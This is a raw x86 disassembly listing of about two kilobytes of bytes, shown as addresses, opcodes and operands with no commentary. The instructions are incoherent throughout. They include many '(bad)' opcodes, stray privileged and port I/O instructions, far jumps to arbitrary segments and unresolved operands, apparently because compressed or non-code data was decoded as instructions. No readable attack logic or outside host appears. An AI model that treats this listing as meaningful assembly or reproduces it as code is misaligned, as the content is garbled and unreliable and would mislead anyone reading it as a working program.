  40635a:	sub    BYTE PTR cs:[ebx-0xac79e86],al
  406361:	shr    DWORD PTR [ecx+ecx*4-0x28],1
  406365:	loopne 0x4063dd
  406367:	ret    0x9d8e
  40636a:	lahf   
  40636b:	push   es
  40636c:	push   0x6e2d2834
  406371:	inc    ebp
  406372:	stc    
  406373:	push   es
  406374:	je     0x40637f
  406376:	lock push ss
  406378:	fdiv   QWORD PTR [esi-0x54]
  40637b:	sub    esp,DWORD PTR [eax+0x7e171361]
  406381:	sub    al,BYTE PTR [edx+0x6a]
  406384:	icebp  
  406385:	(bad)  
  406386:	xrelease xchg BYTE PTR [ebp+0x3940c898],dh
  40638d:	ins    BYTE PTR es:[edi],dx
  40638e:	inc    ebx
  40638f:	int    0x3a
  406391:	mov    ds:0x6957c1e6,al
  406396:	test   DWORD PTR ds:0x6c5f0d54,ebp
  40639c:	push   0x28
  40639e:	jg     0x406333
  4063a0:	fcomi  st,st(7)
  4063a2:	mov    bh,0x1e
  4063a4:	xor    eax,0x7fa0e36
  4063a9:	adc    eax,ecx
  4063ab:	pop    ebp
  4063ac:	ins    DWORD PTR es:[edi],dx
  4063ad:	xchg   dx,ax
  4063af:	imul   ecx,DWORD PTR [edx+0x2c014f0c],0x8
  4063b6:	ins    BYTE PTR es:[edi],dx
  4063b7:	mov    esi,0xf0200278
  4063bc:	fwait
  4063bd:	inc    edi
  4063be:	std    
  4063bf:	out    0x33,al
  4063c1:	fnstcw WORD PTR [ebp+edx*4-0x3c]
  4063c5:	sub    ecx,DWORD PTR cs:[edi+eax*8]
  4063c9:	mov    ?,ebx
  4063cb:	adc    al,0x3f
  4063cd:	add    al,0xd8
  4063cf:	imul   esp,DWORD PTR [eax+0x43c28e44],0x815db6f5
  4063d9:	outs   dx,BYTE PTR ds:[esi]
  4063da:	jbe    0x406448
  4063dc:	leave  
  4063dd:	ss jl  0x4063d0
  4063e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063e1:	nop
  4063e2:	lods   al,BYTE PTR ds:[esi]
  4063e3:	and    edi,DWORD PTR [ecx]
  4063e5:	push   edi
  4063e6:	imul   ebx,DWORD PTR [ebx],0x5569f54d
  4063ec:	jo     0x406393
  4063ee:	push   0xaf698708
  4063f3:	inc    edi
  4063f4:	ins    DWORD PTR es:[edi],dx
  4063f5:	pop    ebp
  4063f6:	inc    esp
  4063f7:	adc    dh,ah
  4063f9:	cmp    eax,DWORD PTR [esi-0x45]
  4063fc:	gs dec ax
  4063ff:	jne    0x406384
  406401:	dec    esp
  406402:	xor    eax,0x784cadee
  406407:	add    ecx,DWORD PTR [ebx]
  406409:	retf   0x412e
  40640c:	jl     0x40646f
  40640e:	add    esp,esp
  406410:	ds pop ss
  406412:	imul   ebx,DWORD PTR [edi],0xfffffff9
  406415:	ds mov ah,0xee
  406418:	std    
  406419:	sti    
  40641a:	(bad)  
  40641b:	sar    BYTE PTR [ebx+0x26],cl
  40641e:	test   DWORD PTR [ecx+eax*8],edi
  406421:	jl     0x4063f6
  406423:	fiadd  WORD PTR [eax-0x76]
  406426:	sbb    ch,al
  406428:	mov    ecx,0x102ba553
  40642d:	xchg   edi,eax
  40642e:	imul   edx,DWORD PTR [eax-0x1c5d2101],0xffffffe5
  406435:	(bad)  
  406437:	mov    bh,0x1d
  406439:	daa    
  40643a:	test   al,0x61
  40643c:	mov    bl,0x2b
  40643e:	push   esp
  40643f:	mov    dh,0x4d
  406441:	aaa    
  406442:	push   ebx
  406443:	loop   0x4064a7
  406445:	fidiv  DWORD PTR [edi-0x6e3e7cad]
  40644b:	stc    
  40644c:	adc    ebx,DWORD PTR [ebp+0x78]
  40644f:	jle    0x406431
  406451:	inc    edi
  406452:	out    dx,eax
  406453:	outs   dx,BYTE PTR ds:[esi]
  406454:	pop    esp
  406455:	jbe    0x4063f9
  406457:	inc    ebx
  406458:	imul   esp,DWORD PTR [edx-0xbdbe30a],0xffffff9f
  40645f:	add    eax,0xe44c1a33
  406464:	xor    eax,0x1a7f90b6
  406469:	mov    al,dh
  40646b:	or     dh,0x95
  40646e:	sub    al,0x5e
  406470:	cmp    DWORD PTR [ebp-0x5e],eax
  406473:	add    al,0x16
  406475:	sub    dl,ch
  406477:	push   ebx
  406478:	mov    al,0x82
  40647a:	addr16 push es
  40647c:	sub    eax,0x97edbd7b
  406481:	mov    eax,0xdc874aec
  406486:	inc    edi
  406487:	mov    cl,0xc3
  406489:	mov    WORD PTR [eax],gs
  40648b:	adc    al,0x49
  40648d:	and    al,0x41
  40648f:	or     ebx,DWORD PTR [eax+ebp*2-0x1ac13d81]
  406496:	xor    al,0x9f
  406498:	push   0x449fc27b
  40649d:	add    bl,BYTE PTR [ebx-0x317dafb6]
  4064a3:	popf   
  4064a4:	xchg   ebx,eax
  4064a5:	in     eax,dx
  4064a6:	mov    ds:0xe03fbf50,eax
  4064ab:	pop    esi
  4064ac:	sub    al,0xe3
  4064ae:	or     DWORD PTR [edx+0x4a],eax
  4064b1:	imul   ecx,DWORD PTR [edi+0x3c],0x0
  4064b5:	or     al,0xb1
  4064b7:	mov    ebp,0x749e5cc3
  4064bc:	add    DWORD PTR [ebp+0x15f4f5ff],ebx
  4064c2:	xchg   BYTE PTR [ebp-0x71],ah
  4064c5:	xor    al,BYTE PTR [edx+0x144f964d]
  4064cb:	jae    0x406454
  4064cd:	xchg   esi,eax
  4064ce:	cs out 0x8e,al
  4064d1:	cld    
  4064d2:	sbb    DWORD PTR ds:0xe7b4f76c,eax
  4064d8:	and    BYTE PTR ds:0x2e6fbb31,0x17
  4064df:	xchg   esi,eax
  4064e0:	std    
  4064e1:	and    DWORD PTR ds:[eax+edx*4+0x2a],ecx
  4064e6:	lods   al,BYTE PTR ds:[esi]
  4064e7:	and    eax,0xa4885035
  4064ec:	shr    BYTE PTR [edi],0xa2
  4064ef:	scas   eax,DWORD PTR es:[edi]
  4064f0:	test   DWORD PTR [eax+0x4d07f9fc],esp
  4064f6:	retf   0x7a1
  4064f9:	and    DWORD PTR [ecx-0x23c1fffa],esi
  4064ff:	adc    BYTE PTR [ebx+0x33],ah
  406502:	je     0x4064d1
  406504:	fadd   DWORD PTR [edx+0x73]
  406507:	inc    eax
  406508:	sub    DWORD PTR [edi-0x580c12bf],esi
  40650e:	add    eax,0x682f2b75
  406513:	popf   
  406514:	push   ecx
  406515:	and    ah,0x3
  406518:	retf   
  406519:	imul   eax,DWORD PTR [edx],0x4e
  40651c:	add    BYTE PTR [edi],bl
  40651e:	push   ds
  40651f:	dec    ah
  406521:	out    0x36,al
  406523:	xchg   esp,eax
  406524:	mov    cl,0xe3
  406526:	xchg   esp,eax
  406527:	inc    esi
  406528:	shr    DWORD PTR [ebp+0x3d2d935e],cl
  40652e:	fs jo  0x4064c5
  406531:	push   edx
  406532:	mov    esp,0x38cc33b
  406537:	int3   
  406538:	(bad)  
  406539:	aam    0x33
  40653b:	dec    ebp
  40653c:	mov    bl,0x9d
  40653e:	pop    edx
  40653f:	xor    eax,0x10c08566
  406544:	jp     0x406532
  406546:	xor    ebp,0xd5ddf8ed
  40654c:	retf   0x73f0
  40654f:	call   0xc25f3b68
  406554:	mov    esp,0xa2e5175b
  406559:	pushf  
  40655a:	fsubr  QWORD PTR [ecx+0x3cc82df2]
  406560:	imul   DWORD PTR [edi-0x116ed9df]
  406566:	push   es
  406567:	xor    al,dl
  406569:	add    eax,0xae4642fa
  40656e:	sub    ecx,DWORD PTR [eax+0x9]
  406571:	cmp    dh,al
  406573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406574:	xchg   edx,eax
  406575:	push   ss
  406576:	jno    0x4065e1
  406578:	push   0x3e829377
  40657d:	(bad)  
  40657f:	or     ebp,DWORD PTR [eax-0x21]
  406582:	add    al,0x46
  406584:	gs inc esp
  406586:	and    edx,DWORD PTR [ebp+0x4d]
  406589:	mov    eax,0xf01b7867
  40658e:	stos   BYTE PTR es:[edi],al
  40658f:	lods   eax,DWORD PTR ds:[esi]
  406590:	dec    esp
  406591:	inc    esp
  406592:	add    BYTE PTR [edi],0xa7
  406595:	aad    0xb4
  406597:	jg     0x40657f
  406599:	fsubr  st,st(4)
  40659b:	js     0x406597
  40659d:	sti    
  40659e:	add    eax,DWORD PTR [ebx+0x1f]
  4065a1:	push   ss
  4065a2:	jmp    0x5ac0:0x8cf2fd9d
  4065a9:	cmp    al,0xd1
  4065ab:	daa    
  4065ac:	les    edx,FWORD PTR [esi+0x14]
  4065af:	stos   DWORD PTR es:[edi],eax
  4065b0:	cli    
  4065b1:	cld    
  4065b2:	jg     0x4065a7
  4065b4:	mov    ebx,0xf9bb8977
  4065b9:	cmp    al,0x3a
  4065bb:	and    al,0x79
  4065bd:	cmp    BYTE PTR [edi-0x39a986fc],dl
  4065c3:	setg   BYTE PTR ds:0x5072dad4
  4065ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065cb:	ret    0x9491
  4065ce:	inc    edi
  4065cf:	and    eax,0xb60ce1a6
  4065d4:	adc    al,ch
  4065d6:	in     eax,dx
  4065d7:	dec    ebx
  4065d8:	jl     0x4065dc
  4065da:	or     BYTE PTR [esp+ebp*2+0x0],0xec
  4065df:	xchg   esp,eax
  4065e0:	pop    ecx
  4065e1:	push   ebx
  4065e2:	dec    edi
  4065e3:	and    esp,0x4587cbb
  4065e9:	push   esp
  4065ea:	xor    al,0x66
  4065ec:	ficom  DWORD PTR [ebp+0x1a]
  4065ef:	mov    cl,0xbe
  4065f1:	mov    ecx,0x29214291
  4065f6:	(bad)  
  4065f7:	mov    ch,0x45
  4065f9:	push   eax
  4065fa:	fucomp st(1)
  4065fc:	clc    
  4065fd:	mov    ah,0x72
  4065ff:	mov    ds:0x3b33a696,al
  406604:	shl    esp,0x96
  406607:	stc    
  406608:	pop    edx
  406609:	xor    eax,0xd7551105
  40660e:	clc    
  40660f:	sub    esi,0x4016852
  406615:	fadd   st,st(3)
  406617:	add    bh,BYTE PTR [eax-0x2b]
  40661a:	cli    
  40661b:	ror    BYTE PTR [eax+0x4ad45da8],1
  406621:	mov    ?,WORD PTR [edx-0x4183a5c1]
  406627:	push   cs
  406628:	outs   dx,DWORD PTR ds:[esi]
  406629:	push   ss
  40662a:	(bad)  
  40662b:	sub    ebx,DWORD PTR [edi+0x4]
  40662e:	cld    
  40662f:	das    
  406630:	iret   
  406631:	xchg   esi,eax
  406632:	jmp    0x4065c6
  406634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406635:	fdivr  QWORD PTR ds:0xc04bbded
  40663b:	xchg   BYTE PTR [edx+ebx*1+0x3dc151f8],ch
  406642:	mov    al,0x84
  406644:	inc    edi
  406645:	sbb    edi,DWORD PTR [edi]
  406647:	mov    ah,0xc6
  406649:	(bad)  
  40664a:	sub    ebp,DWORD PTR [edx+0x73]
  40664d:	and    dh,BYTE PTR [ebp-0x6a]
  406650:	cmp    ebx,DWORD PTR [ecx]
  406652:	das    
  406653:	sub    ch,BYTE PTR [ecx]
  406655:	in     al,0x18
  406657:	and    BYTE PTR [eax+0x68],al
  40665a:	cli    
  40665b:	xchg   BYTE PTR [edi],cl
  40665d:	sbb    cl,bh
  40665f:	mov    fs,edx
  406661:	push   0x4a
  406663:	ror    BYTE PTR [esi-0x675d8315],1
  406669:	pop    ebp
  40666a:	cdq    
  40666b:	sub    DWORD PTR [ecx+edi*1+0x12],esi
  40666f:	sti    
  406670:	loop   0x4065fd
  406672:	(bad)  
  406673:	call   0x5a288b91
  406678:	test   al,0x86
  40667a:	push   esi
  40667b:	mov    al,ds:0xdfb17094
  406680:	pop    es
  406681:	mov    dh,0xb1
  406683:	inc    esp
  406684:	arpl   WORD PTR [esi+0x3],bp
  406687:	in     eax,0xaa
  406689:	jo     0x4066c4
  40668b:	test   DWORD PTR [edx],ebx
  40668d:	inc    bp
  40668f:	fldenv [eax]
  406691:	call   FWORD PTR [edi+esi*4+0x404832af]
  406698:	shl    edx,0x8f
  40669b:	adc    DWORD PTR [eax+0xc],esi
  40669e:	sbb    eax,0x862b331c
  4066a3:	nop
  4066a4:	cmc    
  4066a5:	bound  edx,QWORD PTR [eax+0x21b8bb80]
  4066ab:	sbb    ecx,DWORD PTR [ebx+esi*1]
  4066ae:	cmp    eax,0xaef580f9
  4066b3:	mov    ecx,0x9ae6836e
  4066b8:	aaa    
  4066b9:	xchg   edi,eax
  4066ba:	ud0    eax,DWORD PTR [esi+0x2e]
  4066be:	dec    esp
  4066bf:	push   ds
  4066c0:	jne    0x406714
  4066c2:	pop    edx
  4066c3:	add    eax,0xc4e78d9d
  4066c8:	popf   
  4066c9:	scas   al,BYTE PTR es:[edi]
  4066ca:	inc    esp
  4066cb:	popf   
  4066cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066cd:	mov    bl,0xdb
  4066cf:	cmovl  edx,DWORD PTR [esi]
  4066d2:	imul   esp
  4066d4:	lock test BYTE PTR [esi-0x34],ch
  4066d8:	pusha  
  4066d9:	inc    esp
  4066da:	adc    al,0x8f
  4066dc:	pop    edx
  4066dd:	cmp    BYTE PTR [esi+0x94d1cfb],0x65
  4066e4:	(bad)  
  4066e6:	adc    cl,0x48
  4066e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066ea:	cmp    DWORD PTR [eax-0x57],esp
  4066ed:	dec    esp
  4066ee:	push   ebp
  4066ef:	popf   
  4066f0:	inc    edx
  4066f1:	std    
  4066f2:	imul   BYTE PTR [ebp+0x4]
  4066f5:	fmulp  st(6),st
  4066f7:	xlat   BYTE PTR ds:[ebx]
  4066f8:	jae    0x4066f1
  4066fa:	mov    bh,0xa2
  4066fd:	pop    ebp
  4066fe:	jle    0x4066f2
  406700:	add    edi,edi
  406702:	shr    DWORD PTR [edi-0x29],cl
  406705:	sub    BYTE PTR [eax],bh
  406707:	loope  0x406691
  406709:	icebp  
  40670a:	pop    esp
  40670b:	mov    DWORD PTR [edi],esi
  40670d:	scas   eax,DWORD PTR es:[edi]
  40670e:	fisttp WORD PTR [ecx+0x445ec184]
  406714:	aam    0xd8
  406716:	inc    esi
  406717:	addr16 mov ah,0x96
  40671a:	retf   
  40671b:	jne    0x40673c
  40671d:	sbb    bh,BYTE PTR [edi]
  40671f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406720:	adc    al,0x1b
  406722:	push   edi
  406723:	pop    ds
  406724:	popf   
  406725:	popf   
  406726:	into   
  406727:	or     DWORD PTR [edi],esi
  406729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40672a:	sub    eax,0x9cbe29eb
  40672f:	mov    ah,0x88
  406731:	xor    ah,BYTE PTR [ecx]
  406733:	int3   
  406734:	jmp    0xda90:0xa523c0e5
  40673b:	add    ebx,DWORD PTR [edx+0x233f3901]
  406741:	mov    edi,0xc814b949
  406746:	pop    eax
  406747:	shl    DWORD PTR [edx],1
  406749:	pop    edx
  40674a:	sbb    al,0x16
  40674c:	addr16 in eax,0x80
  40674f:	pop    ss
  406750:	xchg   edx,eax
  406751:	(bad)  
  406752:	loopne 0x40677b
  406754:	sahf   
  406755:	sub    eax,DWORD PTR [esi-0x7e]
  406758:	sub    ch,BYTE PTR [ecx+0x385aa412]
  40675e:	adc    dl,0x83
  406761:	lods   eax,DWORD PTR ds:[esi]
  406762:	mov    ecx,0x34dd4d7a
  406767:	lahf   
  406768:	cmc    
  406769:	in     eax,0xba
  40676b:	mov    eax,ds:0x97b42829
  406770:	lds    edi,FWORD PTR [ecx-0x42]
  406773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406774:	adc    BYTE PTR [ebx+0x77cd92a5],ah
  40677a:	cs pop esp
  40677c:	add    eax,0x85854116
  406781:	call   0x55be:0xb31eb5a8
  406788:	(bad)  
  406789:	les    eax,FWORD PTR [bp+si-0x25]
  40678d:	js     0x4067f5
  40678f:	nop
  406790:	cld    
  406791:	jns    0x40679b
  406793:	es daa 
  406795:	or     ebx,eax
  406797:	scas   al,BYTE PTR es:[edi]
  406798:	mov    dh,0x76
  40679a:	add    DWORD PTR [esp+edi*1-0x348fee8a],eax
  4067a1:	arpl   WORD PTR [eax+0x754a61cb],di
  4067a7:	or     DWORD PTR [edi+edx*1+0x727d1acd],esi
  4067ae:	or     eax,0xbcc1a04e
  4067b3:	inc    esp
  4067b4:	or     BYTE PTR [ecx-0xa],dl
  4067b7:	aad    0x67
  4067b9:	xchg   BYTE PTR [di],bl
  4067bc:	test   BYTE PTR [ebp-0x6674fbe],ah
  4067c2:	cs dec eax
  4067c4:	adc    eax,0x40d10125
  4067c9:	rcl    BYTE PTR [edx+0x27],0xc2
  4067cd:	enter  0x5f27,0xaf
  4067d1:	push   0x4e
  4067d3:	js     0x406778
  4067d5:	cmp    edi,eax
  4067d7:	gs fcmovbe st,st(7)
  4067da:	fnstsw WORD PTR [esi-0x1060992c]
  4067e0:	push   esi
  4067e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067e2:	pushf  
  4067e3:	adc    BYTE PTR [edi+0x66],bl
  4067e6:	scas   eax,DWORD PTR es:[edi]
  4067e7:	jb     0x406846
  4067e9:	enter  0xd92d,0xa4
  4067ed:	shl    DWORD PTR [eax+0x424b731c],0x76
  4067f4:	xchg   ebx,eax
  4067f5:	jae    0x4067ac
  4067f7:	xor    dl,ah
  4067f9:	repnz sbb BYTE PTR [edx-0x62],0x81
  4067fe:	mov    WORD PTR [edx+edi*2],?
  406801:	pause  
  406803:	sahf   
  406804:	cmp    edx,DWORD PTR [edx+0x64536e9b]
  40680a:	fistp  DWORD PTR [edi+0x3f]
  40680d:	mov    dl,0x6a
  40680f:	push   ebx
  406810:	cmc    
  406811:	mov    esp,0x5ed3ece
  406816:	ror    BYTE PTR [ecx-0x63],cl
  406819:	add    bh,BYTE PTR [ebp+0x6d]
  40681c:	pop    ebp
  40681d:	add    dh,BYTE PTR [ecx+0x33219834]
  406823:	push   cs
  406824:	jne    0x4067e9
  406826:	sub    al,0xfe
  406828:	(bad)  
  406829:	fidivr WORD PTR [edx]
  40682b:	pop    edx
  40682c:	ins    BYTE PTR es:[edi],dx
  40682d:	in     eax,0xfe
  40682f:	mov    dh,BYTE PTR [eax-0x2f]
  406832:	lds    esi,FWORD PTR [ebx+0x13]
  406835:	jg     0x40689d
  406837:	idiv   DWORD PTR [esi+0x59]
  40683a:	xor    dh,BYTE PTR [eax-0x17720624]
  406840:	jbe    0x406829
  406842:	call   0x38dc7850
  406847:	dec    edx
  406848:	(bad)  
  406849:	lock into 
  40684b:	mov    ah,0xd
  40684d:	(bad)  
  40684e:	test   DWORD PTR [ebp-0x78],0xbefe7e55
  406855:	mov    eax,0xa32972c0
  40685a:	gs mov dh,0xad
  40685d:	out    dx,eax
  40685e:	jmp    0x81a9:0x57b8f55
  406865:	sahf   
  406866:	xor    ch,al
  406868:	fisttp WORD PTR [edx]
  40686a:	(bad)  
  40686b:	test   DWORD PTR [ebp-0x63166193],ebx
  406871:	leave  
  406872:	iret   
  406873:	jl     0x406859
  406875:	or     al,0x2f
  406877:	inc    eax
  406878:	add    DWORD PTR [edi+0x72],ecx
  40687b:	sti    
  40687c:	dec    edx
  40687d:	lea    edi,[eax+0x1f]
  406880:	push   es
  406881:	mov    ch,0xbf
  406883:	and    al,0xcb
  406885:	loope  0x406897
  406887:	clc    
  406888:	add    cl,0x76
  40688b:	arpl   WORD PTR [esi],bx
  40688d:	xchg   ecx,eax
  40688e:	jbe    0x406875
  406890:	pop    eax
  406891:	movntps XMMWORD PTR [eax],xmm4
  406894:	sub    al,0x79
  406896:	pop    edx
  406897:	data16 mov bh,0x53
  40689a:	push   ss
  40689b:	dec    ebp
  40689c:	fdivr  DWORD PTR [eax+ecx*2]
  40689f:	mov    ebp,esi
  4068a1:	mov    ds,ebx
  4068a3:	ror    DWORD PTR [ecx+0xa4d7cd2],cl
  4068a9:	test   BYTE PTR [ebx-0x5fbc62af],bl
  4068af:	add    DWORD PTR [ecx-0xef22474],ebp
  4068b5:	sbb    eax,0x58231cba
  4068ba:	xor    DWORD PTR [ebx-0x374e5666],eax
  4068c0:	out    dx,eax
  4068c1:	sbb    cl,dh
  4068c3:	loopne 0x40685a
  4068c5:	cmp    ebx,DWORD PTR [ebx]
  4068c7:	test   BYTE PTR [edi+0x26feaa6d],0x2
  4068ce:	dec    esp
  4068cf:	sbb    BYTE PTR [esi],ch
  4068d1:	sub    eax,0x3efbad85
  4068d6:	int3   
  4068d7:	sbb    BYTE PTR [ecx],0xfd
  4068da:	lea    ebx,[eax+0x72781fc0]
  4068e0:	in     eax,dx
  4068e1:	lea    esp,[edx-0x12]
  4068e4:	sub    DWORD PTR [edx],edi
  4068e6:	jne    0x4068ce
  4068e8:	bndldx bnd0,[esi]
  4068eb:	outs   dx,DWORD PTR ds:[esi]
  4068ec:	fs aas 
  4068ee:	xchg   ebp,eax
  4068ef:	in     al,dx
  4068f0:	loopne 0x406905
  4068f2:	cmp    DWORD PTR [esi-0x53fccd4a],esp
  4068f8:	sbb    DWORD PTR [eax],edi
  4068fa:	arpl   WORD PTR [ebp-0x9f6511d],dx
  406900:	loope  0x40689d
  406902:	mov    bh,0xe4
  406904:	popf   
  406905:	(bad)  
  406906:	(bad)  
  406907:	(bad)  
  406909:	xchg   ch,ah
  40690b:	inc    ecx
  40690c:	mov    gs,WORD PTR [edi-0x1b]
  40690f:	call   0x49ae:0xaca96743
  406916:	add    eax,0x7aed606c
  40691b:	ins    BYTE PTR es:[edi],dx
  40691c:	mov    ecx,0x81c3ae80
  406921:	fistp  DWORD PTR ds:0x51bb8b2c
  406927:	jecxz  0x406908
  406929:	inc    ebp
  40692a:	jl     0x40691a
  40692c:	or     eax,ebp
  40692e:	daa    
  40692f:	cmp    eax,0x941a4e4
  406934:	scas   eax,DWORD PTR es:[edi]
  406935:	xlat   BYTE PTR ds:[ebx]
  406936:	cld    
  406937:	jne    0x406902
  406939:	aas    
  40693a:	sbb    al,0x92
  40693c:	push   ss
  40693d:	push   edi
  40693e:	push   ss
  40693f:	jo     0x40699e
  406941:	cmp    ah,BYTE PTR [ebx-0x29]
  406944:	pop    edi
  406945:	mov    al,ds:0x416deea9
  40694a:	mov    dl,0xf9
  40694c:	sar    BYTE PTR [esi],cl
  40694e:	arpl   WORD PTR [edx-0x48],sp
  406951:	retf   
  406952:	sbb    bh,BYTE PTR [ebx-0x2b]
  406955:	cmc    
  406956:	pushf  
  406957:	dec    edx
  406958:	enter  0xf962,0x17
  40695c:	hlt    
  40695d:	and    al,0x31
  40695f:	sbb    eax,0x67eac6ec
  406964:	cli    
  406965:	aam    0x1b
  406967:	iret   
  406968:	popa   
  406969:	lahf   
  40696a:	xor    ebp,DWORD PTR [ebx-0x27]
  40696d:	enter  0xb95b,0x23
  406971:	or     bh,BYTE PTR [ecx]
  406973:	repnz and ecx,esi
  406976:	sub    al,0xe
  406978:	or     BYTE PTR [edi-0xb0637ae],bh
  40697e:	(bad)  
  40697f:	js     0x40690a
  406981:	pop    esi
  406982:	add    BYTE PTR [ecx+0x72],ch
  406985:	outs   dx,DWORD PTR ds:[esi]
  406986:	mov    DWORD PTR gs:[ebp+ecx*2+0x4a659002],edx
  40698e:	and    DWORD PTR [ecx+0x60fa0675],esi
  406994:	mov    ch,0x6
  406996:	fsub   QWORD PTR [edx]
  406998:	cmp    eax,ebp
  40699a:	jne    0x406991
  40699c:	retf   0xea31
  40699f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069a0:	xor    DWORD PTR ds:0xc2b18402,0xc47d9f00
  4069aa:	add    eax,0xea818444
  4069af:	jge    0x406a18
  4069b1:	xchg   esi,ebp
  4069b3:	jnp    0x406947
  4069b5:	ss xor esi,ebp
  4069b8:	mov    WORD PTR [ecx+edx*8-0x56ccbb89],es
  4069bf:	fdiv   st(1),st
  4069c1:	ret    0x3c84
  4069c4:	test   al,0x41
  4069c6:	mov    ah,0x10
  4069c8:	or     BYTE PTR [ecx+esi*4],ch
  4069cb:	or     DWORD PTR [esi],edx
  4069cd:	ror    DWORD PTR [edx],cl
  4069cf:	push   edi
  4069d0:	xor    eax,DWORD PTR [eax+0x3d]
  4069d3:	test   al,0x58
  4069d5:	cli    
  4069d6:	or     edi,DWORD PTR [edx]
  4069d8:	jg     0x406a57
  4069da:	sahf   
  4069db:	xor    edi,DWORD PTR [edi]
  4069dd:	sub    dl,BYTE PTR [ecx+eax*1+0x1e]
  4069e1:	mov    dh,0x64
  4069e3:	ja     0x4069a8
  4069e5:	cmovl  edx,DWORD PTR [ebx]
  4069e8:	sub    esi,DWORD PTR [ecx-0x7069687d]
  4069ee:	mov    edi,0xf6495c2
  4069f3:	adc    ah,cl
  4069f5:	adc    BYTE PTR [esi+0x170fc07e],bh
  4069fb:	mov    dh,0xfa
  4069fd:	mov    ebx,0x880666a7
  406a02:	add    eax,0x351239c
  406a07:	push   ebx
  406a08:	add    BYTE PTR [ebp+ecx*4+0x3d2db3b],ch
  406a0f:	jnp    0x4069a0
  406a11:	xchg   esp,eax
  406a12:	xor    dh,BYTE PTR [ebx+0x2aa6c8ce]
  406a18:	mov    esi,?
  406a1a:	mov    DWORD PTR [edx],esi
  406a1c:	cmp    al,0x90
  406a1e:	ss stos BYTE PTR es:[edi],al
  406a20:	push   edi
  406a21:	aam    0xf8
  406a23:	sub    BYTE PTR [ebx],dh
  406a25:	jl     0x406a6d
  406a27:	call   0x3b7cff56
  406a2c:	push   ebx
  406a2d:	scas   eax,DWORD PTR es:[edi]
  406a2e:	and    dl,BYTE PTR [esi]
  406a30:	sub    eax,0xbd795e63
  406a35:	jge    0x406a19
  406a37:	ss in  eax,dx
  406a39:	cmp    dh,bl
  406a3b:	scas   al,BYTE PTR es:[di]
  406a3d:	in     al,0x97
  406a3f:	lea    esp,[eax+0x44842a24]
  406a45:	call   0xdf3a7634
  406a4a:	jae    0x4069db
  406a4c:	mov    cl,0xa9
  406a4e:	daa    
  406a4f:	leave  
  406a50:	cmc    
  406a51:	xchg   ebx,eax
  406a52:	xor    ecx,edx
  406a54:	clc    
  406a55:	les    eax,FWORD PTR [esi-0x3d]
  406a58:	xchg   edi,eax
  406a59:	gs push ebx
  406a5b:	xchg   BYTE PTR [ecx+edi*1-0x5483ac57],ah
  406a62:	push   ds
  406a63:	lods   al,BYTE PTR ds:[esi]
  406a64:	repnz popa 
  406a66:	js     0x406aa8
  406a68:	imul   ebx,DWORD PTR [ebx+0x62],0x77ba7c89
  406a6f:	pop    DWORD PTR [esi+eiz*8+0x68]
  406a73:	sbb    dh,ch
  406a75:	sbb    DWORD PTR [ecx+0x3e],0xffffff8b
  406a79:	icebp  
  406a7a:	cmp    eax,0x9b3105e5
  406a7f:	fist   DWORD PTR [ecx+0x6a]
  406a82:	lods   al,BYTE PTR ds:[esi]
  406a83:	push   0xd96de03a
  406a88:	cmp    DWORD PTR [ecx],esi
  406a8a:	or     al,0x2b
  406a8c:	out    dx,al
  406a8d:	ins    DWORD PTR es:[edi],dx
  406a8e:	pusha  
  406a8f:	jo     0x406a1a
  406a91:	push   eax
  406a92:	adc    al,cl
  406a94:	push   0xc813a500
  406a99:	aam    0x8c
  406a9b:	pop    ecx
  406a9c:	mov    al,ds:0xb6090e35
  406aa1:	jl     0x406ab5
  406aa3:	loope  0x406a2a
  406aa5:	sbb    eax,0x79584c32
  406aaa:	push   edx
  406aab:	js     0x406a97
  406aad:	sbb    eax,0xc3d3e870
  406ab2:	jo     0x406a80
  406ab4:	lds    ebp,FWORD PTR [ebp+0x69bb484c]
  406aba:	inc    ecx
  406abb:	jl     0x406b15
  406abd:	ficom  WORD PTR [eax+0x105300b9]
  406ac3:	retf   0xca52
  406ac6:	sbb    edi,esp
  406ac8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ac9:	leave  
  406aca:	jmp    0xa26fdd36
  406acf:	ret    
  406ad0:	and    BYTE PTR [esi],cl
  406ad2:	fcmovu st,st(0)
  406ad4:	xchg   edi,eax
  406ad5:	sbb    al,BYTE PTR [edx-0x79]
  406ad8:	mov    ecx,0x8bbe39ba
  406add:	mov    bh,0x1d
  406adf:	retf   
  406ae0:	xor    DWORD PTR [ecx+0x3c],ebx
  406ae3:	jne    0x406a9c
  406ae5:	mov    al,0x8c
  406ae7:	inc    esp
  406ae8:	out    dx,al
  406ae9:	or     cl,BYTE PTR [ebp-0xf]
  406aec:	pop    es
  406aed:	lods   eax,DWORD PTR ds:[esi]
  406aee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406aef:	iret   
  406af0:	fs xchg edx,eax
  406af2:	push   ebp
  406af3:	test   BYTE PTR [ebx+0xf],0x31
  406af7:	ret    
  406af8:	sbb    eax,ebp
  406afa:	sub    DWORD PTR ds:0x15aea86e,edi
  406b00:	pop    ebp
  406b01:	popa   
  406b02:	cli    
  406b03:	sti    
  406b04:	(bad)  
  406b05:	repz jl 0x406ae5
  406b08:	mov    DWORD PTR [esi+edi*8-0x2c],ebx
  406b0c:	ins    DWORD PTR es:[edi],dx
  406b0d:	mov    fs,WORD PTR [edi+0x73]
  406b10:	mov    al,0x96
  406b12:	addr16 xchg edx,eax
  406b14:	push   ecx
  406b15:	int3   
  406b16:	adc    DWORD PTR [edx+0x1b],edx
  406b19:	add    dh,BYTE PTR [ecx-0x45ca645b]
  406b1f:	pop    edx
  406b20:	dec    edx
  406b21:	sub    al,0x5c
  406b23:	and    esp,DWORD PTR ds:0x9c8a2b68
  406b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b2a:	pop    esi
  406b2b:	outs   dx,BYTE PTR ds:[esi]
  406b2c:	arpl   WORD PTR [edi+edx*2+0x55],dx
